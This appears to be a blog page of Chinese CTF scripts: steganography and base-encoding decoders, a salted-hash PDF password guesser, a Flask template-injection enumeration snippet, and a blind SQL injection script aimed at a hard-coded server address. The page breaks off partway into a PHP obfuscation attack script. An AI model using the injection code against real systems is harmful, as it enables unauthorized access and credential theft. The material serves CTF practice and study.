<h2 id="base64隐写解密脚本"><a href="#base64隐写解密脚本" class="headerlink" title="base64隐写解密脚本"></a>base64隐写解密脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_base64_diff_value</span><span class="params">(s1, s2)</span>:</span></span><br><span class="line">    base64chars = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'</span></span><br><span class="line">    res = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(len(s2)):</span><br><span class="line">        <span class="keyword">if</span> s1[i] != s2[i]:</span><br><span class="line">            <span class="keyword">return</span> abs(base64chars.index(s1[i]) - base64chars.index(s2[i]))</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve_stego</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'3.txt'</span>, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        file_lines = f.readlines()</span><br><span class="line">        bin_str = <span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> file_lines:</span><br><span class="line">            steg_line = line.replace(<span class="string">'\n'</span>, <span class="string">''</span>)</span><br><span class="line">            norm_line = line.replace(<span class="string">'\n'</span>, <span class="string">''</span>).decode(<span class="string">'base64'</span>).encode(<span class="string">'base64'</span>).replace(<span class="string">'\n'</span>, <span class="string">''</span>)</span><br><span class="line">            diff = get_base64_diff_value(steg_line, norm_line)</span><br><span class="line">            <span class="keyword">print</span> diff</span><br><span class="line">            pads_num = steg_line.count(<span class="string">'='</span>)</span><br><span class="line">            <span class="keyword">if</span> diff:</span><br><span class="line">                bin_str += bin(diff)[<span class="number">2</span>:].zfill(pads_num * <span class="number">2</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                bin_str += <span class="string">'0'</span> * pads_num * <span class="number">2</span></span><br><span class="line">            <span class="keyword">print</span> goflag(bin_str)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">goflag</span><span class="params">(bin_str)</span>:</span></span><br><span class="line">    res_str = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>, len(bin_str), <span class="number">8</span>):</span><br><span class="line">        res_str += chr(int(bin_str[i:i + <span class="number">8</span>], <span class="number">2</span>))</span><br><span class="line">    <span class="keyword">return</span> res_str</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    solve_stego()</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="奇怪的TTL密码脚本-63-127-191-255"><a href="#奇怪的TTL密码脚本-63-127-191-255" class="headerlink" title="奇怪的TTL密码脚本(63 127 191 255)"></a>奇怪的TTL密码脚本(63 127 191 255)</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">fp = open(<span class="string">'t.txt'</span>,<span class="string">'r'</span>)</span><br><span class="line">a = fp.readlines()</span><br><span class="line">p = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    p.append(int(i))</span><br><span class="line">s = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> p:</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">63</span>:</span><br><span class="line">        a = <span class="string">'00'</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="number">127</span>:</span><br><span class="line">        a = <span class="string">'01'</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="number">191</span>:</span><br><span class="line">        a = <span class="string">'10'</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="number">255</span>:</span><br><span class="line">        a = <span class="string">'11'</span></span><br><span class="line">    s += a</span><br><span class="line"><span class="comment"># print(s)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(s),<span class="number">8</span>):</span><br><span class="line">    flag += chr(int(s[i:i+<span class="number">8</span>],<span class="number">2</span>))</span><br><span class="line">flag = binascii.unhexlify(flag)</span><br><span class="line">wp = open(<span class="string">'res.jpg'</span>,<span class="string">'wb'</span>)</span><br><span class="line">wp.write(flag)</span><br><span class="line">wp.close()</span><br><span class="line"><span class="comment">#00111111 63</span></span><br><span class="line"><span class="comment">#01111111 127</span></span><br><span class="line"><span class="comment">#10111111 191</span></span><br><span class="line"><span class="comment">#11111111 255</span></span><br></pre></td></tr></table></figure>
<hr>
<h2 id="PDF爆破hash密码"><a href="#PDF爆破hash密码" class="headerlink" title="PDF爆破hash密码"></a>PDF爆破hash密码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time    : 2019/5/1 11:19</span></span><br><span class="line"><span class="comment"># @Author  : wulasite</span></span><br><span class="line"><span class="comment"># @Email   : wulasite@gmail.com</span></span><br><span class="line"><span class="comment"># @File    : readpdf.py</span></span><br><span class="line"><span class="comment"># @Software: PyCharm</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pdfminer.pdfparser <span class="keyword">import</span> PDFParser,PDFDocument</span><br><span class="line"><span class="keyword">from</span> pdfminer.pdfinterp <span class="keyword">import</span> PDFResourceManager, PDFPageInterpreter</span><br><span class="line"><span class="keyword">from</span> pdfminer.converter <span class="keyword">import</span> PDFPageAggregator</span><br><span class="line"><span class="keyword">from</span> pdfminer.layout <span class="keyword">import</span> LTTextBoxHorizontal,LAParams</span><br><span class="line"><span class="keyword">from</span> pdfminer.pdfinterp <span class="keyword">import</span> PDFTextExtractionNotAllowed</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha1</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_pdf</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> [i <span class="keyword">for</span> i <span class="keyword">in</span> os.listdir(<span class="string">"./"</span>) <span class="keyword">if</span> i.endswith(<span class="string">"pdf"</span>)]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">convert_pdf_2_text</span><span class="params">(path)</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(path, <span class="string">'rb'</span>) <span class="keyword">as</span> fp:</span><br><span class="line">        <span class="comment"># 用文件对象来创建一个pdf文档分析器</span></span><br><span class="line">        praser = PDFParser(fp)</span><br><span class="line">        <span class="comment"># 创建一个PDF文档</span></span><br><span class="line">        doc = PDFDocument()</span><br><span class="line">        <span class="comment"># 连接分析器 与文档对象</span></span><br><span class="line">        praser.set_document(doc)</span><br><span class="line">        doc.set_parser(praser)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 提供初始化密码</span></span><br><span class="line">        <span class="comment"># 如果没有密码 就创建一个空的字符串</span></span><br><span class="line">        doc.initialize()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 检测文档是否提供txt转换，不提供就忽略</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> doc.is_extractable:</span><br><span class="line">            <span class="keyword">raise</span> PDFTextExtractionNotAllowed</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># 创建PDf 资源管理器 来管理共享资源</span></span><br><span class="line">            rsrcmgr = PDFResourceManager()</span><br><span class="line">            <span class="comment"># 创建一个PDF设备对象</span></span><br><span class="line">            laparams = LAParams()</span><br><span class="line">            device = PDFPageAggregator(rsrcmgr, laparams=laparams)</span><br><span class="line">            <span class="comment"># 创建一个PDF解释器对象</span></span><br><span class="line">            interpreter = PDFPageInterpreter(rsrcmgr, device)</span><br><span class="line"></span><br><span class="line">            res = <span class="string">''</span></span><br><span class="line">            <span class="comment"># 循环遍历列表，每次处理一个page的内容</span></span><br><span class="line">            <span class="keyword">for</span> page <span class="keyword">in</span> doc.get_pages():</span><br><span class="line">                interpreter.process_page(page)</span><br><span class="line">                <span class="comment"># 接受该页面的LTPage对象</span></span><br><span class="line">                layout = device.get_result()</span><br><span class="line">                <span class="comment"># 这里layout是一个LTPage对象 里面存放着 这个page解析出的各种对象 一般包括LTTextBox, LTFigure, LTImage, LTTextBoxHorizontal 等等 想要获取文本就获得对象的text属性，</span></span><br><span class="line">                <span class="keyword">for</span> x <span class="keyword">in</span> layout:</span><br><span class="line">                    <span class="keyword">if</span> isinstance(x, LTTextBoxHorizontal):</span><br><span class="line">                        res += x.get_text().strip()</span><br><span class="line">                        <span class="comment"># print(res)</span></span><br><span class="line">            <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_password</span><span class="params">()</span>:</span></span><br><span class="line">    pdf_path = get_pdf()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> pdf_path:</span><br><span class="line">        print(<span class="string">"Searching word in "</span> + i)</span><br><span class="line">        pdf_text = convert_pdf_2_text(<span class="string">'./'</span>+i)</span><br><span class="line">        <span class="comment"># 这里的分隔符用空格和回车就够了，主要是分割出单词</span></span><br><span class="line">        pdf_text = re.split(<span class="string">' | \n'</span>, pdf_text)</span><br><span class="line">        <span class="keyword">for</span> word <span class="keyword">in</span> pdf_text:</span><br><span class="line">            print(word)</span><br><span class="line">            enc_word = (word + <span class="string">'Salz!'</span>).encode(<span class="string">"utf-8"</span>)</span><br><span class="line">            sha1_password = hashlib.sha1(enc_word).hexdigest()</span><br><span class="line">            <span class="keyword">if</span> sha1_password == <span class="string">'3fab54a50e770d830c0416df817567662a9dc85c'</span>:</span><br><span class="line">                print(<span class="string">"Find the password :"</span> + word)</span><br><span class="line">                exit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    find_password()</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="flask模板注入"><a href="#flask模板注入" class="headerlink" title="flask模板注入"></a>flask模板注入</h2><p>检测有哪些含有os模板的模块可以用<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line">num=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> <span class="string">''</span>.__class__.__mro__.__subclasses__():</span><br><span class="line">    <span class="keyword">if</span> a.__name__ == <span class="string">'catch_warnings'</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> a.__init__.__globals__.values():</span><br><span class="line">            <span class="keyword">if</span> b.__class__ == &#123;&#125;.__class__:</span><br><span class="line">                <span class="keyword">if</span> <span class="string">'eval'</span> <span class="keyword">in</span> b.keys():</span><br><span class="line">                    <span class="keyword">print</span> num,item</span><br><span class="line">            num+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">except</span>: </span><br><span class="line">        <span class="keyword">print</span> <span class="string">'-'</span></span><br><span class="line">        num+=<span class="number">1</span></span><br></pre></td></tr></table></figure></p>
<hr>
<h2 id="base家族解密脚本-85-16-32-64"><a href="#base家族解密脚本-85-16-32-64" class="headerlink" title="base家族解密脚本(85\16\32\64)"></a>base家族解密脚本(85\16\32\64)</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64 </span><br><span class="line"></span><br><span class="line">find_decode = <span class="keyword">lambda</span> d , data : eval(<span class="string">f'base64.<span class="subst">&#123;d&#125;</span>(<span class="subst">&#123;data&#125;</span>)'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span><span class="params">(data)</span>:</span></span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> dir(base64): </span><br><span class="line">    <span class="keyword">if</span> i[<span class="number">3</span>:] == <span class="string">'decode'</span>:</span><br><span class="line">      <span class="keyword">try</span>: </span><br><span class="line">        decode_data = find_decode(i,data)</span><br><span class="line">        chars = decode_data <span class="keyword">if</span> all(chr(x).isalpha() <span class="keyword">or</span> chr(x).isspace() <span class="keyword">for</span> x <span class="keyword">in</span> decode_data)<span class="keyword">else</span> <span class="literal">None</span> </span><br><span class="line">        <span class="keyword">if</span> chars != <span class="literal">None</span> : </span><br><span class="line">          <span class="keyword">return</span> <span class="string">f'Decoded String is: <span class="subst">&#123;chars.decode(<span class="string">"utf-8"</span>)&#125;</span>\nEncrypet was used is: <span class="subst">&#123;i[:<span class="number">3</span>]&#125;</span>'</span></span><br><span class="line">      <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#_______________ Test _________________</span></span><br><span class="line"></span><br><span class="line">print(decode(<span class="string">b'NM&amp;qnZy;B1a%^M'</span>)) <span class="comment">#output : Hello World , b85</span></span><br><span class="line">print(decode(<span class="string">b'48656C6C6F20576F726C64'</span>))<span class="comment">#output : Hello World , b16</span></span><br><span class="line">print(decode(<span class="string">b'SGVsbG8gV29ybGQ='</span>))<span class="comment">#output : Hello World , b64</span></span><br><span class="line">print(decode(<span class="string">b'JBSWY3DPEBLW64TMMQ======'</span>))<span class="comment">#output : Hello World , b32</span></span><br></pre></td></tr></table></figure>
<hr>
<h2 id="base64隐写脚本"><a href="#base64隐写脚本" class="headerlink" title="base64隐写脚本"></a>base64隐写脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_base64_diff_value</span><span class="params">(s1, s2)</span>:</span></span><br><span class="line">    base64chars = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'</span></span><br><span class="line">    res = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(len(s2)):</span><br><span class="line">        <span class="keyword">if</span> s1[i] != s2[i]:</span><br><span class="line">            <span class="keyword">return</span> abs(base64chars.index(s1[i]) - base64chars.index(s2[i]))</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve_stego</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'3.txt'</span>, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        file_lines = f.readlines()</span><br><span class="line">        bin_str = <span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> file_lines:</span><br><span class="line">            steg_line = line.replace(<span class="string">'\n'</span>, <span class="string">''</span>)</span><br><span class="line">            norm_line = line.replace(<span class="string">'\n'</span>, <span class="string">''</span>).decode(<span class="string">'base64'</span>).encode(<span class="string">'base64'</span>).replace(<span class="string">'\n'</span>, <span class="string">''</span>)</span><br><span class="line">            diff = get_base64_diff_value(steg_line, norm_line)</span><br><span class="line">            <span class="keyword">print</span> diff</span><br><span class="line">            pads_num = steg_line.count(<span class="string">'='</span>)</span><br><span class="line">            <span class="keyword">if</span> diff:</span><br><span class="line">                bin_str += bin(diff)[<span class="number">2</span>:].zfill(pads_num * <span class="number">2</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                bin_str += <span class="string">'0'</span> * pads_num * <span class="number">2</span></span><br><span class="line">            <span class="keyword">print</span> goflag(bin_str)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">goflag</span><span class="params">(bin_str)</span>:</span></span><br><span class="line">    res_str = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>, len(bin_str), <span class="number">8</span>):</span><br><span class="line">        res_str += chr(int(bin_str[i:i + <span class="number">8</span>], <span class="number">2</span>))</span><br><span class="line">    <span class="keyword">return</span> res_str</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    solve_stego()</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="盲注脚本"><a href="#盲注脚本" class="headerlink" title="盲注脚本"></a>盲注脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://111.198.29.45:42192/zhuanxvlogin"</span></span><br><span class="line"><span class="comment"># url = "http://localhost:9090/zhuanxvlogin"</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">first</span><span class="params">()</span>:</span></span><br><span class="line">    admin_password = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">9</span>):</span><br><span class="line">        <span class="keyword">for</span> n <span class="keyword">in</span> range(<span class="number">30</span>,<span class="number">140</span>):</span><br><span class="line">            guess = chr(n)</span><br><span class="line">            <span class="keyword">if</span> guess == <span class="string">"_"</span> <span class="keyword">or</span> guess == <span class="string">"%"</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            username = <span class="string">"aaa'\nor\n(select\nsubstring(password,"</span>+str(i)+<span class="string">",1)\nfrom\nUser\nwhere\nname\nlike\n'homamamama')\nlike\n'"</span>+guess+<span class="string">"'\nor\n''like'"</span></span><br><span class="line">            data = &#123;<span class="string">"user.name"</span>: username, <span class="string">"user.password"</span>: <span class="string">"a"</span>&#125;</span><br><span class="line">            req = requests.post(url, data=data, timeout=<span class="number">1000</span>).text</span><br><span class="line">            <span class="keyword">if</span> len(req)&gt;<span class="number">5000</span>:</span><br><span class="line">                admin_password = admin_password + guess</span><br><span class="line">                <span class="keyword">print</span> <span class="string">"admin password: "</span>+ admin_password</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> admin_password</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">second</span><span class="params">(admin_password)</span>:</span></span><br><span class="line">    flag = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">        <span class="keyword">for</span> n <span class="keyword">in</span> range(<span class="number">30</span>,<span class="number">140</span>):</span><br><span class="line">            guess = chr(n)</span><br><span class="line">            <span class="keyword">if</span> guess == <span class="string">"_"</span> <span class="keyword">or</span> guess == <span class="string">"%"</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            username = <span class="string">"aa'\nor\n(select\nsubstring(welcometoourctf,"</span>+str(i)+<span class="string">",1)\nfrom\nFlag)\nlike\n'"</span>+guess+<span class="string">"'\nand\n''like'"</span></span><br><span class="line">            data = &#123;<span class="string">"user.name"</span>: username, <span class="string">"user.password"</span>: admin_password&#125;</span><br><span class="line">            req = requests.post(url, data=data, timeout=<span class="number">1000</span>).text</span><br><span class="line">            <span class="keyword">if</span> len(req)&gt;<span class="number">5000</span>:</span><br><span class="line">                flag = flag + guess</span><br><span class="line">                <span class="keyword">print</span> <span class="string">"flag:"</span> + flag</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">admin_password = first()    </span><br><span class="line">second(admin_password)</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="php混淆攻击脚本"><a href="#php混淆攻击脚本" class="headerlink" title="php混淆攻击脚本"></a>php混淆攻击脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint,choice</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choicePart</span><span class="params">(seq,amount)</span>:</span></span><br><span class="line">    length = len(seq)</span><br><span class="line">    <span class="keyword">if</span> length == <span class="number">0</span> <span class="keyword">or</span> length &lt; amount:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'Error Input'</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    result = []</span><br><span class="line">    indexes = []</span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> count &lt; amount:</span><br><span class="line">        i = randint(<span 